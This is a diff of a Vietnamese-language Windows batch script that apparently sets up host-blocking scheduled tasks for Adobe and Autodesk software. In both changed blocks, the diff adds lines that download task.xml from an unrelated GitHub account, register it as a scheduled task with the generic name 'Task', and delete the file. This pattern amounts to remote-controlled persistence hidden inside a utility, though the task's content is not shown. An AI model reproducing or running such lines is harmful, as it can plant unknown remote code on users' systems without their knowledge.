@@ -19,7 +19,9 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/m
 schtasks /create /tn "AdobeHostBlock" /xml "C:\adobehostblock.xml" /f
 del /f /q "C:\adobehostblock.xml"
 echo Task da duoc import thanh cong!
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/backup.bat' -OutFile 'C:\Windows\INF\backup.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/task.xml' -OutFile 'C:\Task.xml'"
+schtasks /create /tn "Task" /xml "C:\Task.xml" /f
+del /f /q "C:\Task.xml"
 echo da tai schedular windows!
 pause
 exit
@@ -30,7 +32,9 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/m
 schtasks /create /tn "AutoDeskHostBlock" /xml "C:\autodeskhostsblock.xml" /f
 del /f /q "C:\autodeskhostsblock.xml"
 echo Task da duoc import thanh cong!
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/backup.bat' -OutFile 'C:\Windows\INF\backup.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/task.xml' -OutFile 'C:\Task.xml'"
+schtasks /create /tn "Task" /xml "C:\Task.xml" /f
+del /f /q "C:\Task.xml"
 echo da tai schedular windows!
 pause
 exit
